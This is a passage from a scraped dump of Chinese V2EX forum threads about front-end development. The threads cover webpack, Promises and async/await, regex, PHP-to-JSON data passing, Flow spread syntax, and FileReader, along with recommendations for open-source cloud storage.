<code>require('./node_modules/bootstrap/less/bootstrap.less')</code> ,但感觉这个办法有点搓...</p>\n<p>有什么更好解决方案的朋友吗?</p>\n</div></div>"], "reply": "10", "tittle": "webpack 的 Code Splitting 不支持第三方 css 吗?", "comment": ["因为 npm 包的 main file 是不会包含 CSS ，因此你这样子的写法 CSS 根本不会算是 vendor", "其实说实话你这样子管理 vendor 还不如写一个 entry", "['bootstrap', 'bootstrap/less/bootstrap.less']", "可以 require.ensure 你的 css. 会把 css 压到分离的 js 里面的", "把 style-loader 去掉", " 这个应该就是你想要的", " 看一下 bootstrap 的 main 文件,确实不会包含 css 文件,谢谢.\r", "\r", "\r", " 这也是种办法,谢谢.\r", "\r", "\r", " 按需加载看起来更好,谢谢.\r", "\r", "\r", " 去掉无效.谢谢.\r", "\r", "\r", " 之前看了,都试了,无效.", " 我试过 require.ensure 依赖 js 和 css 文件，本来是都 bundle 去一个 chunk 上面去。可是开了 ExtractTextPlugin 之后 css 就去了 extract 出来的那个 css bundle 了（和整个项目的 css 一起）。\r", "\r", "是功能限制还是我方式不对吗？", "  style-loader 的作用就是以内连的方式来加载 css ，你配置中， less 跟 css 都配置了 style-loader ，两个都去掉了吗？", " 都去掉了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/MarkoCen/trial-js\" rel=\"nofollow\">GitHub</a></p>\n<p><a href=\"http://markocen.github.io/trialjs/trial-js.html\" rel=\"nofollow\">Examples</a></p>\n<p>灵感来于最近一个 SPA 项目中经常出现的场景：<br>\n用户点击某个按钮然后显示 API 返回数据，\n如果网络延迟比较大，用户经常会等一会才能看到数据，\n所以想了一个办法，当用户将 pointer 移到按钮的附近区域时，提前请求数据，从而降低用户的延迟感受～</p>\n</div></div>"], "reply": "2", "tittle": "写了个简单的库用于监测 pointer 位置，用于预测用户 Input", "comment": ["有趣，可以用来做关注点分析，已 star\r", "欢迎互访~https://www.v2ex.com/t/278516#reply14", "把按钮做大一点，顺便把 click 换成 hover ，这样更好接受。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>臭不要脸地来宣传一发个人项目 smooth-scrollbar （ <a href=\"https://github.com/idiotWu/smooth-scrollbar\" rel=\"nofollow\">https://github.com/idiotWu/smooth-scrollbar</a> ）：</p>\n<p>在之前的公司开发股票 SPA 应用（ <a href=\"https://a.jimu.com\" rel=\"nofollow\">https://a.jimu.com</a> ）时，由于设计需要自定义滚动条，但找遍 Github 也没看到一个完美的，于是着手开发一个全新的滚动条插件。经过半年的开发调试，个人觉得功能上已经趋于完备，希望能够得到更大范围的测试 :)。如果你正在开发的 web app 需要自定义滚动条组件，不妨试试 <a href=\"https://github.com/idiotWu/smooth-scrollbar\" rel=\"nofollow\">smooth-scrollbar</a> 。</p>\n<p>另外顺便求一份前端兼职，坐标日本东京，远程工作希望。附简历： <a href=\"https://idiotwu.me/resume/\" rel=\"nofollow\">https://idiotwu.me/resume/</a></p>\n</div></div>"], "reply": "6", "tittle": "smooth-scrollbar - 大概是目前最好的高性能自定义滚动条插件", "comment": ["看起来很不错！已 star~欢迎互访~https://www.v2ex.com/t/278516", "可以实现与延迟的联动效果吗？", " 联动效果具体指的是？", "就是两个滑动区域联动啊😄", " 如果你指的是这个 ", " 🌚", " 明白了，这个项目是 scrollller bar , 我寻求的是 scrolller"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>pom.xml 中含有</p>\n<pre><code>        &lt;dependency&gt;\n            &lt;groupId&gt;org.webjars&lt;/groupId&gt;\n            &lt;artifactId&gt;jquery&lt;/artifactId&gt;\n            &lt;version&gt;3.0.0-alpha1&lt;/version&gt;\n        &lt;/dependency&gt;\n</code></pre>\n<p>index.jsp 中有</p>\n<pre><code>    &lt;script type=\"text/javascript\" src=\"webjars/jquery/3.0.0-alpha1/jquery.min.js\"&gt;&lt;/script&gt;\n</code></pre>\n<p>但是为什么 不可以使用?</p>\n<pre><code>    &lt;script type=\"text/javascript\"&gt;\n            $(document).ready(function(){\n                $(\"#redmsg\").css(\"color\",\"red\");\n            });\n    &lt;/script&gt;\n</code></pre>\n<p>没有任何效果</p>\n</div></div>"], "reply": "3", "tittle": "maven jquery 为什么无法使用了?", "comment": ["我只想说 maven 发什么神经,以前是可以用的,换到 arch 就不行了", "你不如先 mvn clean package 一下看看是否能成功下载所有依赖？\r", "若能成功下载，就不是 maven 的锅。找找你 IDE 的问题吧。", "依赖都可以下载,不是 IDE 问题,我直接终端运行`mvn jetty:run`和 IDE 有什么关系?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>版本新增</h3>\n<ul>\n<li>增加播放列表</li>\n<li>增加歌曲桌面通知，可在插件选项中设置通知停留时间</li>\n</ul>\n<h4><a href=\"https://github.com/zhiyul/1Player\" rel=\"nofollow\">GitHub</a></h4>\n<p>喜欢就星一下吧</p>\n<h1>1Player for <a href=\"http://music.163.com\" rel=\"nofollow\">music.163.com</a></h1>\n<p>使用 1Player 控制你的网易云音乐播放器，通过快捷键可以在做其他工作时方便地控制歌曲免除来回切换的烦恼。</p>\n<p>样式参考 <a href=\"https://www.anotherhome.net/file/APlayer/\" rel=\"nofollow\">APlayer</a></p>\n<h4><a href=\"https://chrome.google.com/webstore/detail/1player/bbleianliopbinjkpnmnhikiplblaifl?hl=zh-CN\" rel=\"nofollow\">下载地址</a></h4>\n<h2>Introduction</h2>\n<h4>Screenshot</h4>\n<p><img alt=\"image\" src=\"http://7xls2e.com1.z0.glb.clouddn.com/1player_5.png\"></p>\n<h4>桌面通知</h4>\n<p><img alt=\"image\" src=\"http://7xls2e.com1.z0.glb.clouddn.com/1player_3.png\"></p>\n<h4>设置桌面通知停留时间</h4>\n<p><img alt=\"image\" src=\"http://7xls2e.com1.z0.glb.clouddn.com/1player_4.png\"></p>\n<h4>自定义快捷键</h4>\n<p><img alt=\"image\" src=\"http://7xls2e.com1.z0.glb.clouddn.com/1player_2.png\"></p>\n<h2>Version</h2>\n<h4>1.0.3</h4>\n<ul>\n<li>增加播放列表</li>\n<li>增加歌曲桌面通知，可在插件选项中设置通知停留时间</li>\n</ul>\n<h4>1.0.2</h4>\n<ul>\n<li>修改了一些 bug</li>\n</ul>\n<h4>1.0.1</h4>\n<ul>\n<li>插件面板同步当前播放歌曲信息</li>\n<li>插件面板可控制 上一曲、下一曲、暂停 /播放、播放进度、播放模式</li>\n<li>点击插件面板的歌曲 /歌手可快速进如对应歌曲 /歌手页面</li>\n<li>快捷键控制 上一曲、下一曲、暂停 /播放、复制当前播放歌曲链接至剪切板</li>\n</ul>\n<h2>LICENSE</h2>\n<p>MIT © <a href=\"http://github.com/zhiyul\" rel=\"nofollow\">zhiyul</a></p>\n</div></div>"], "reply": "34", "tittle": "1Player for 网易云音乐（ chrome 插件）更新啦！", "comment": ["持续更新中", "已经加✨了，请好好照顾好我的猫。", "这个好！", " 已经是我的猫了。。\r", " 感谢支持", "在 V 站看主题，不明白明明是“扩展”却有那么多人爱叫它们“插件”。", " ..啊 叫习惯了 - - 见谅见谅", "👍 棒棒哒。", "哈哈 真正做一个类似的 已经写了一个礼拜了 这两天把界面写完也能上架了", " 感谢\r", " 期待 ing ！", "感谢~", " 客气了 :)", "prpr ， APlayer 好评(逃", " prprprpr", "赞。 好棒", " 谢谢支持", "mark", "图标好难看，可以加个选项，设置图标为网易云音乐图标", " 恩恩，感谢提议", "直接在网页版听歌是不是不能选择音质？", "已经 star~", " 嘻嘻，感谢支持。\r", " 音质这个我还没有注意过诶，- - 我是低端用户。", "只是控制么？还需要打开网易云音乐页面放着，那我用网易云音乐不是更省事", " 对哈。因为这个是从我自己平时的需求出发做的，我是 web 党，不喜欢下客户端。", "图标不够高清啊 看着怪怪的\r", " ", " - - UI 不擅长，相关的东西下个版本会改善，见谅。", "我每次用浏览器听歌，一不注意就把浏览器给关了", " 哈哈哈，你需要多多练习", "这个好", "做得好棒，求支持 FM", " fm 在计划之中，但是因为网易的 fm 现在是 demo 阶段，所以优先级靠后一些。感谢你的支持 微笑：）", "貌似很不错的样子～", "bPlayer 作者前来围观 2333333", " 发现一个问题， win10 切换桌面时（ Ctrl+Win+→）会下一首，反之上一首，扩展的快捷键已经设置成（ Alt+→）", "好像是因为网易云网页的快捷键"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>主要是利用 JS 正则来验证一些如手机号、身份证号、邮箱、 Url 、 IP 等，写到了一个文件里面，同时也扩展了 String 的原型方法，方便使用。几个方法比较简陋，欢迎丰富一下，地址<a href=\"https://github.com/thundernet8/JSRegexs\" rel=\"nofollow\">https://github.com/thundernet8/JSRegexs</a></p>\n</div></div>"], "reply": "2", "tittle": "整理了一个常见字符正则验证工具", "comment": ["手机号还有 17* 吧；如果不能确认实时符合标准，最好不要校验这类，可能会降低输入体验。", " 有 17 的，谢谢提醒，这个可以给大家一个参考，毕竟为了代码整洁，会直接写到项目 js 里面"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://ww2.sinaimg.cn/large/93d5a393gw1f3x1jiz8yqj20k104oaau.jpg\">\n还是说是我的写法错误？\n我本意是想匹配\na （任意非&amp;） c\n或者\nb （任意非&amp;） c\n或者\na （任意非&amp;） d\n或者\nb （任意非&amp;） d\n然是并不想捕获 ab 或 cd 这两个组。，然而报错，\n另外， js 中似乎也不能使用零宽断言？\n<img alt=\"\" src=\"http://ww2.sinaimg.cn/large/93d5a393jw1f3x1p2779wj20gs04k3z8.jpg\"></p>\n</div></div>"], "reply": "5", "tittle": "javascript 中的正则表达式无法使用非捕获组？", "comment": ["反正在 python 中是 (?:a|b)", " 好神奇。。。\r", "而且我刚刚测试，似乎预测先行断言是可以的，但是回顾后发断言貌似报错，难道有更神奇的使用方式么。。。", " 用了你的方法貌似的确可以。。", " 我又去瞄了一眼当年看的正则教程。。。看起来是我记错了。。。。  ?:  貌似是标准的使用方式。。", "(?:x)\r", "Matches 'x' but does not remember the match. The parentheses are called non-capturing parentheses"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人学生程序狗一枚，初学<strong>javascript</strong>一年余。\n最近想做一个富文本编辑器，支持 markdown 的。\n在 Github 上找到了 CodeMirror 的源码并下载了，但我并不能看懂。\n能否有大神给我一点解析? 正则我会。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "求解析 CodeMirror 的源码运作方式", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需要实现这样子的功能，文章摘要列表，自动水平滚动轮播放。\ngoogle 了好久，都是针对图片的 slider 插件。找到符合需要的，却只支持 jquery <a href=\"http://1.4.xxx\" rel=\"nofollow\">1.4.xxx</a>,我现在在用 1.12.3 。\n自动写的代码效果不太好。\n求推荐插件，求代码。</p>\n</div></div>"], "reply": "4", "tittle": "jquery 如何实现文章摘要列表水平轮播放功能？", "comment": ["slick 图轮，灵活性很大，配合 slick-animation ，还能做动画。", " 这个好", "几个元素横向滚动切换呗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如说做一件事分几个动作： step1 、 step2 、 finish ，前两个是异步的， step1 完成后才能执行 step2 （然后 finish ）。我想到用 Promise 这么写：</p>\n<pre><code>let prom = new Promise((resolve, reject) =&gt; {\n  // step1 ，用 setTimeout 模拟一下异步\n  setTimeout(() =&gt; resolve('1'), 1000);\n  // 先忽略 reject 相关动作\n});\nprom.then(data =&gt; {\n  // step2\n  setTimeout(() =&gt; {\n    prom.then(data =&gt; {\n      // finish\n      console.log(`完成: ${data}`)\n    });\n  }, 1000);\n});\n</code></pre>\n<p>可这样不就成 callback hell 了吗？而且从 step2 往后传数据也不方便。</p>\n<p>由此引发的还有 step1 出错执行<code>reject()</code>如何中止整个过程的问题。</p>\n<p>还是我对 Promise 的理解有问题？</p>\n</div></div>"], "reply": "36", "tittle": "用 Promise 如何把多个连续的异步过程写得优雅一点？", "comment": ["then 可以 return 一个 promise...然后就可以继续 then 了...", " 是可以链式调用，但不能让 step2 的异步完成后再执行 finish", " step1.then((d) => step2(d)).then(() => finish())", "链式调用的时候，你可以用.catch ，任何一步出错都会跳到最后的 reject ，就和 try catch 一样。然后只要你写的每一个 Promise 都有 return Promise ，就可以链式调用。只是我不知道怎么让第一个 Promise 的数据传递到最后，我就用了 block variable 。", "\r", "\r", "这个应该很直观了", "建议还是使用匿名方法吧..写的太长了...还是不够整齐的.\r", "Promise 你当做一个流程的管理.不要把逻辑代码过多的放进去", "试试 async/await", " \r", "按这个思路试了一下，结果不符预期：\r", "<script src=\"", ".js\"></script>\r", "step2 也是一个异步动作， finish 需要 step2 完成后才能执行", "```\r", "\r", "new Promise((resolve, reject) => { //step 1\r", "\tsetTimeout(() => resolve('1'), 1000);\r", "}).then(data => {\r", "\treturn new Promise((resolve, reject) => { //step 2\r", "\t\tsetTimeout(() => resolve([data, '2']), 1000);\r", "\t}).then(data => { //finish\r", "\t\tconsole.log('finish', data);\r", "\t});\r", "});\r", "\r", "```", "\r", "function step1Async() {\r", "    return new Promise((resolve, reject) => {\r", "        step1((error, result) => {\r", "            if (error) {\r", "                reject(error);\r", "            } else {\r", "                resolve(result);\r", "            }\r", "        });\r", "    });\r", "}\r", "...\r", "try{\r", "    const result = await step1Async();\r", "    await step2Async();\r", "    await finishAsync();\r", "} catch(error){\r", "    // error\r", "}", "格式全乱了，看来这里不适合讨论代码。。。", "<script src=\"", ".js\"></script>", "我一般不喜欢使用 Promise 构造函数  我一般这么用的\r", "\r", "\r", "```\r", "let prom = new Promise();\r", "\r", "prom.then(data => {\r", "  // step 2\r", "  let prom1 = new Promise();\r", "  setTimeout(() => prom1.resolve('2'), 1000);\r", "  return prom1;\r", "}).then(data =>{\r", "  // step 3\r", "  return \"3\";\r", "}).then(data =>{\r", "  // finish\r", "  console.log('finish', data); \r", "});\r", "\r", "// step 1\r", "setTimeout(() => prom.resolve('1'), 1000);\r", "\r", "\r", "```\r", "\r", "  如果 then 里 return 的值是 promise  则将 resolve 的结果传入下一个 then   \r", "\r", "  如果 then 里 return 返回的不是 promise  则将结果直接传入下一个 then", "这里的陷阱在于你的 setTimeout 是 callback 风格的，不是 promise 风格的\r", "\r", "一定要那 setTimeout 打比方（或者比如外部库是 callback 风格）的话，一定要先转换成 promise 风格\r", "\r", "```\r", "\r", "function step1() {\r", "    console.log('step1 start');\r", "    return new Promise(resolve => {setTimeout( ()=> {resolve('step1 result');}, 1000)});\r", "}\r", "function step2(data) {\r", "    console.log('step2, param is', data);\r", "    return new Promise(resolve => {setTimeout( ()=> {resolve('step2 result');}, 1000)});\r", "}\r", "\r", "\r", "//正常的 promise 串行代码如下\r", "step1()\r", "    .then(step2)\r", "    .then(result => { \r", "        console.log('finish, param is', result)\r", "    });\r", "```\r", "\r", "bluebird 等三方 promise 一般都提供标准的 promisify 方法做这件事", "赞同 @", " . promise 用的爽前提是你的异步函数已经包成 promise 了，而不是每次都在 then()里生成 promise.", "核心是你先把 setTimeout 改成返回 Promise 的方法，然后就爽了", "Promise.delay", "支持 generator 吗？如果支持可以参考下这篇 ", "\r", "还有 co ", " 原来是我说的太简略...请看 @", " 的回复...", "async 大法好", "感谢 @", " @", " @", " \r", "我发现我的问题在于不知道`then()`的参数返回一个 Promise 会并入外部的 Promise composition （ MDN 没有写啊……），看来还是我对 Promise 的理解不到位。\r", "\r", "现在的问题就是中间的`catch()`如何优雅地中止掉整个 composition 。调用`reject()`后会直接跳到后面最近的 rejection handler ，然后就继续走正常路线了。不是应该有个`Promise.prototype.cancel()`之类的方法吗？\r", "\r", "to @", " : 另外，我说的是 ES2015 里的 Promise ，构造函数的参数必须要有，这个怪我一开始没说清。", " Promise.all()", "用 RxJS 代替。", " `Promise.all()`就不是分步了呀", " 我上面不是还发了个链接演示怎么分步么", " ", " 抱歉没搞好，左上角要选择 ES6", " 我是说「 step2 的异步成功后执行 finish 」这个需求用`Promise.all()`不能实现", "通过空 Promise 实现了一个中止过程功能：\r", "\r", "但感觉这样不优雅。\r", "\r", "Any idea?", "各种大神回复了，楼主还是没明白。。。", "所以我觉得其实是 promise 本身的问题 （逃", "楼主对 Promise 根本不熟练，其次 step1 和 step2 的逻辑就是一样的，可以封装在一起。两行搞定\r", "```\r", "const step = data=>new Promise(resolve=>setTimeout(resolve, 1000, data));\r", "step('1').then(step).then(data=> console.log(`完成: ${data}`));\r", "```", " 刚学。如果是需要各个动作可以独立工作呢？", " 如果是独立的就另外处理。 Promise 的重点是形成 Promise 链， then 的函数要返回具体的对象或者 Promise 作为下一个传递。我看你把一个 Promise then 了两次，也就是说 resolve 后两个 then 都会执行并不会顺着一条链执行了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>commit: <a href=\"https://chromium.googlesource.com/v8/v8.git/+/d08c0304c5779223d6c468373af4815ec3ccdb84\" rel=\"nofollow\">https://chromium.googlesource.com/v8/v8.git/+/d08c0304c5779223d6c468373af4815ec3ccdb84</a></p>\n<p>HN: <a href=\"https://news.ycombinator.com/item?id=11710613\" rel=\"nofollow\">https://news.ycombinator.com/item?id=11710613</a></p>\n</div></div>"], "reply": "25", "tittle": "原生 async await 来了, 好激动", "comment": ["v6 会加入吗?顺便把 import 给加了就好", "Python 大法好", "干嘛用的？", "这个功能可以有", " v6 是什么鬼", " 目前来看是异步的最佳写法", " 最爽", " 版本", "c#已经用了几年了", "看标题我以为是 C# 了", "希望 node 7.0 会有吧 😍", "看标题我以为是 python", "微软的 ", " 早就支持了..", " +1", "真棒！不知道 nodejs v6 会不会上", "golang 大法好", "我好兴奋!", "nodejs 7 应该有吧...", "真不知道怎么吐槽 nodejs ，版本更新频繁的要死，可是用户最关心的功能切每每都没有来。", " 这不来了吗", " python 3.5 有了", "node 加入 module 和 async 就可以踢开 babel 了", " 嗯嗯，已经在用了", "async/await 调试的时候会不会很蛋疼？"]},
{"content": ["<div class=\"topic_content\">初学 ajax ，从数据库里捞数据，用 responseText 实现后，都转换为了 string ，可以转回 array 么？\r<br>\r<br>PHP 取数据代码：\r<br>－$data 中是需要的数据，是一个 array\r<br> \r<br>&lt;?php\r<br>\r<br>\t$conn=mysql_connect(\"localhost\",\"root\",\"root\");\r<br>\tif(!$conn){\r<br>\t\techo \"连接失败\";\r<br>\t}\r<br>\r<br>\tmysql_select_db(\"gold_price\",$conn);\r<br>\tmysql_query(\"set names utf8\");\r<br>\r<br>\t$sql=\"select * from `gold_price`\";\r<br>\t$res=mysql_query($sql,$conn);\r<br>\t//print_r(mysql_fetch_array($res));\r<br>\r<br>\t$j = 0;\r<br>\twhile($row=mysql_fetch_row($res)){\r<br>\t\t$data[$j] = $row[2];\r<br>\t\t$date[$j++] = $row[1]; \r<br>\t}\r<br>\r<br>\tprint_r($data);\r<br>\r<br>?&gt;\r<br>-----------------------------------------------------------------------------------------------------\r<br>javascript 部分\r<br>function byphp(){\r<br>\tvar byphp = xmlhttp.responseText;\r<br>\talert(byphp);\r<br>｝\r<br>\r<br>然后 byphp 就成了 string\r<br>\r<br>眼睁睁看着结果是下面这样，就是没法用 array 操作数据，好心塞。\r<br>Array\r<br>(\r<br>    [0] =&gt; 272.95\r<br>    [1] =&gt; 272.95\r<br>    [2] =&gt; 272.95\r<br>    [3] =&gt; 270.20\r<br>    [4] =&gt; 268.00\r<br>    [5] =&gt; 270.40\r<br>    [6] =&gt; 270.40\r<br>    [7] =&gt; 270.80\r<br>    [8] =&gt; 270.80\r<br>    [9] =&gt; 267.30\r<br>    [10] =&gt; 267.30\r<br>    [11] =&gt; 267.50\r<br>    [12] =&gt; 267.60\r<br>    [13] =&gt; 267.75\r<br>    [14] =&gt; 267.40\r<br>    [15] =&gt; 267.40\r<br>    [16] =&gt; 268.50\r<br>    [17] =&gt; 270.75\r<br>    [18] =&gt; 270.75\r<br>    [19] =&gt; 269.60\r<br>    [20] =&gt; 268.70\r<br>)</div>"], "reply": "10", "tittle": "一个 array，用 responseText 捞出来的转换为 string，有方法还原成 array 么", "comment": ["种瓜得瓜，种豆得豆。\r", "你只能定义一个前后都可以接受的数据格式，之后在 byphp 里面解析出来转成数组。", "中间用一个 dif 封装一下~", "print_r 就错了", " 求指导～", "print_r($data);   改成 print_r(json_encode($data));\r", "js 部分\r", "alert(JSON.parse(byphp));\r", "另外要兼容 ie 6 ， 7 html 中要引入 JSON 库", " \r", "直接交方法感觉不太好~\r", "应该让 lz 自己发现 json/xml 等数据交互格式~\r", "然后学习和筛选~", " \r", " \r", "大谢，既解决现有问题，又有学习方向 ：）", "我记得用 ajax 取返回值的话，如果 PHP 加一个 header(\"Content-type:application/json\")的话，回调的结果就是一个 json 对象，否则就是一个 string", "print_r 就错了。这货是调试用的，你拿来输出还怎么玩。\r", "直接 echo json_encode($arr); 就行了\r", "\r", "5 楼的做法是错的。", "  5 楼( @", " ) 的做法是有不妥,但并不是错的, 因为 print_r 在输出数据的时候, 如果是 字符串或者数据, 其效果等同于 echo.\r", "\r", "而 json_encode 的返回结果就是字符串, 所以他那里等于变相的使用了 echo 进行数据输出."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>export function create(styles: Object): {[name: string]: number} {\n  const platformStyles = {};\n  Object.keys(styles).forEach((name) =&gt; {\n    let {ios, android, ...style} = {...styles[name]};\n    if (ios &amp;&amp; Platform.OS === 'ios') {\n      style = {...style, ...ios};\n    }\n    if (android &amp;&amp; Platform.OS === 'android') {\n      style = {...style, ...android};\n    }\n    platformStyles[name] = style;\n  });\n  return StyleSheet.create(platformStyles);\n}\n</code></pre>\n</div></div>"], "reply": "25", "tittle": "这个函数里的... 是什么东西，这么神奇，还有函数声明后面的{}。", "comment": ["annotation ？", "这是 react native 里面的代码吧？ react native 貌似用的不是原生的 js 而是 flow.js? 类似 typescript 之类的", "第一个是 es6 的 rest parameter ，第二个是一个类型，函数返回值的类型。", "那个类型里定义了一个 es6 的 computed property", "...是 destructuring\r", "函数声明后边那个{}是返回值类型声明\r", "这段代码就是 typescript", " 这段代码中的用法应被称作 spread 而不是 rest. 是展开而不是集合.\r", "\r", "而且这是还未定型的 ES7 的特性.", "醉了，越来越搞不懂 js 要干嘛了。。。。", " 看到有类型指定就是 TS 了呀。 ES6 的 destructuring 和 spread 一起很好用", "  不是 js 要干嘛，是那些公司，团体，个人相对 js 干点啥～ 呵呵～", "js 算不算常见语言里语法最奇怪的？感觉已经远超 perl 了", "TypeScript 吧，不过语法还是 ES6/2015/***", " JS 语法感觉还行，但是有一些奇怪的机制。", " \r", " \r", " \r", " \r", " \r", " \r", "的确是 TypeScript,刚刚看了下语法，发现 JS 的写法越来越逆天了。\r", "这里有 RN javascript 的特殊语法，大概能看懂，自己写有点难： ", "三个点叫做 object spread syntax 。", " spread 是 ES6 的吧，怎么会是 ES7 的呢", "其实就是为了写起来方便，简化字典操作。", "js 有赶超 ruby 的趋势", "  object spread 是 ES7 ， Array/call spread 是 ES6 ，应该是这样的。", " 在语法上跟 Ruby 元编程技巧有的一拼了。", "typeScript  js 的一个超集    现在非常流行\r", " \r", "上面这些语法什么的 js 暂时还不支持   之后会支持的", " 这个代码是哪里的？ TypeScript 还没支持这个 ES8 object property spread and rest 的特性吧？ TypeScript 2.1 才有。 ", " 这个应该是 babel+typeflow, \r", "babel-cli 再加上 babel-preset-es2015 ，和 babel-plugin-transform-object-rest-spread 这个插件。\r", "\r", "\r", "TypeScript 还不支持 object property spread and rest.", "不知道现在回复是否支持 Markdown 了，如果不支持的话请看上面的 gist 。\r", "\r", "这段代码应该来自 ", "\r", "\r", "`...` 是通过 [babel]( ", ") 转译的 Rest/Spread 。具体请看 ", "\r", "- `let {ios, android, ...style} = obj` 可以理解成 `let ios = obj.ios; let android = obj.android; let style = \"obj 中除去 ios 和 android 之外的所有 property\";`\r", "- `let` 右侧的 `{...styles[name]}` 可以理解成 `Object.assign({}, styles[name]);`\r", "- 同理，`style = {...style, ...android};` 会被 babel 转译成 `style = Object.assign({}, style, android);`\r", "\r", "函数签名中的 `: Object` 以及 `: {[name: string]: number}` 是 [flow]( ", ") 的类型标注（并不是 TypeScript ）。换句话说，`create` 这个函数接受一个类型为 `Object` 的参数 `styles`，并返回一个类型为 `{[name: string]: number}` 的值。\r", "- 除去 `number`、`string`、`boolean`、`null` 以及 `undefined` 之外的任何类型均可被标注为 `Object`\r", "  - ", "\r", "- `{[name: string]: number}` 代表这是一个从 `string` 到 `number` 的映射。举个例子的话，这个函数返回 `{ a: 12, b: 13 }` 是没有问题的，但如果返回 `{ a: 12, b: 'foo' }` 则会报错，因为 `'foo'` 是一个 `string` 而不是 `number`\r", "  - ", " 写的很好。\r", "其实已多年看代码的经验就明白，只是觉得写的很神奇。\r", "赞你的解释。让我更清楚了语法相关的内容。"]},
{"content": ["<div class=\"topic_content\">分页是前端做的，我一次 load20 条数据，先展示 10 条，到底部再加 10 条。问题来了，怎么让页面不会抖一下呢？</div>"], "reply": "21", "tittle": "前端异步加载分页数据，怎么优雅展现", "comment": ["  用这个？", "抖一下是什么 你没用 append 直接清除原来的行然后重绘么？", " 我是 append 进去，原来的没有清除啊", " 额，不用插件", "append 元素页面不会发生抖动的，只有滚动条位置会重置下，发生抖动应该是代码有问题，排除 bug 即可", " 是高度增加了，所以感觉滚动条会动一下", " 滚动条也几乎在原来的位置，抖得不明显，只是有强迫症。有没有办法完全不动？", " 可能我说得不清，没有抖，是动了一下。", " 滚动条变短这个你破不了吧", "是第一次没有滚动条，然后 20 条出现了滚动条导致页面变窄？", " 没明白你的意思 高度增加了滚动条位置肯定要变的 为什么要让它不动？", " 好吧。是我多想了，不可能不变短的。\r", " 你如果觉得突然变化无法接受那只能自己实现滚动条，屏蔽浏览器自己的滚动条，然后借助滚动条插件来实现，可以位置渐变视觉效果不错，不过个人感觉对大部分人来说这个意识不大", " 我猜是在滚动下去的时候，有一个速度。这时再插东西就会改变。好吧，反正不是太明显，就这样算了。", "去 twitter 看看就知道了", " 对，就是这种效果。我怎么看不出来", " twitter 的是靠近底部就更新吧？\r", "我也实现过类似的功能，更新时候页面没有动：\r", "\r", "if($(window).scrollTop() + $(window).height() > $(document).height() - 100) { xxxxxx }", " 我也是这样的。", " 那要不你改成插入到 dom 后是 display:none 的，然后用个 slideDown 慢慢放出来看看是哪里抖动了", " 手抖，我看其他浏览器好像没问题。 mac 下的 chrome 有点抖，不是很明显。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1.有基本的功能：上传文件，下载文件，移动文件，层次分明，便于管理文件。\n2.javascript 或者 jQery 写的\n3.还有一个问题， google 了一些，发现上传文件的后端基本都是用的 PHP ，这是为什么？\n4.十分感谢</p>\n</div></div>"], "reply": "25", "tittle": "有没有开源的云盘的代码，类似百度云", "comment": ["owncloud", "seafiles", "我觉得是因为 php 开源系统多，各种电商啊，论坛啊，一大堆", "比较倾向于那种 plug-in 样式的  有吗？", "这个手伸成这样居然没人喷。。你现把 jquery 拼对好么，算了我不管我自己大小写了，我看到我打字到现在也懒得回退改", " 手误你也计较。。。初学者找个现有的学习一下不行吗", "想找可以基于 S3 后端的 ..一直没找到", "bittorrent sync", " 这种智障去回复他干嘛，抓住一点错就开喷...", " S3 的流量费你考虑过吗，，，", "owncloud+1  插件强大到超越百度云", " 觉得…还好吧，主要是文档的存储同步，和图片冷存储", " 主要是可以 s3 的话，不需要担心服务稳定性…", " S3 这种流量比储存贵，而且进站流量免费的，一般是定位为备份盘的，用来做网盘(也就是产生出站流量)有点得不偿失了。", "当然稳定性确实好，不需要担心了。", " 刚才查了查，貌似 BeDrive 支持 S3 ，然而是收费的。  \r", "可以去 ", " 看下。", " 据测试，大数据量文件没有海文稳定，会掉。而且 own 的苹果客户端还是付费的。", "试试看一个叫 ibarn 的?", " \r", "seafiles 的有些功能是收费的吧，可能不符合楼主需求 ", "owncloud 有插件支持 s3 后端。", "Owncloud 在国内不接底气啊，云价格太高了", "自己假设  用 amh  集成 owncloud", " 试试 189 的？", " 你在里面有多少数据？", "seafile 免费版没有搜索 让人想疯掉", "owncloud+1 界面友好还有客户端，棒棒哒"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>简单来说，我要从本地选择一个模型文件并且在页面加载它类似这样： load(fileUrl)\n但是上传文件后，在 js 中获取到的是一个本地虚拟地址，传入这个地址的话是会被浏览器拒绝访问的，我搜了一整天，没有找到能用的解决方法。\n有一个方法是将文件上传到服务器后返回其地址，但是模型文件大的话大小可能有几 M 到几十 M ，这样子的话效率比较低，想问问有没有什么方法可以实现本地调用文件？</p>\n</div></div>"], "reply": "8", "tittle": "js 如何使用选择上传的本地文件？", "comment": ["<input id=\"fxxk\" type=file></input>\r", "监听一下 fxxk 的 change 事件,拿一下 ev.target.files, 送给楼上的 FileReader 就好", "感谢楼上两位！ 看了下 api ，尝试用了用 FileReader.result ，终于成功了！然后发现问题所在：\r", "读取数据有三个方法，只有第一个才能生效，文档里说： the result attribute contains a data: URL representing the file's data.  大意就是返回一个 URL 代表这个文件\r", "\r", "readAsDataURL(resultFile);\r", "readAsBinaryString(resultFile);\r", "readAsText(resultFile,'UTF-8');\r", "\r", "正常代码：\r", "var reader = new FileReader();\r", "\r", "reader.readAsDataURL(resultFile);\r", "\r", "reader.onload = function (e) {\r", "   load(reader.result);\r", "}", "不知道为什么不行。\r", "不过首先你为什么先读了再挂 onload 事件？不是应该反过来吗？", "   咦，你这么一说我才发现。这段代码是从网上教程找来修改后的 TAT ，不过实际运行还是可以跑，可能是文件比较大，还没加载完时就绑定好事件了。。。可能加载的文件小的话就会出 bug 了。。。 多谢提醒", "  读文件是异步的，代码执行到 .onload 那里的时候，文件才刚开始读。.onload 只是监听 load 事件，要等文件读完了才会触发这个事件。", 